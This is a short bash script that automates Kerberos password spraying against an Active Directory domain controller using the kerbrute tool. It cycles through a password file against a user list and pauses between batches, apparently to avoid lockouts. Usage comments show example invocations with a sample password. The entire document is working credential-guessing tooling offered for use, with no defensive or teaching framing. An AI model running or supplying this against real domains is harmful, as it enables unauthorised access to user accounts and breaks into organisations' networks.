#!/bin/bash  
  
# Use:
# brute domain.com thedc.domain.com users.txt passfile limit delay 
# Like this:
# brute domain.com thedc.domain.com users.txt passfile 8 31 | tee -a spray.out  
# template:
# kerbrute passwordspray -d domain.com --dc thedc users.txt 'Password2022!' | tee -a spray.out  

domain=$1  
dc=$2  
userfile=$3  
passfile=$4  
limit=$5  
delay=$(($6*60))  
  
i=1  
  
while read line;  
do  
echo "$i: Spraying: $line"  
kerbrute passwordspray -d $domain --dc $dc $userfile $line  
if [[ $((i % limit)) == 0 ]]; then  
echo "Waiting $delay seconds..."  
sleep $delay  
fi  
i=$((i+1))  
done <$passfile  
  
echo "Done with $passfile"
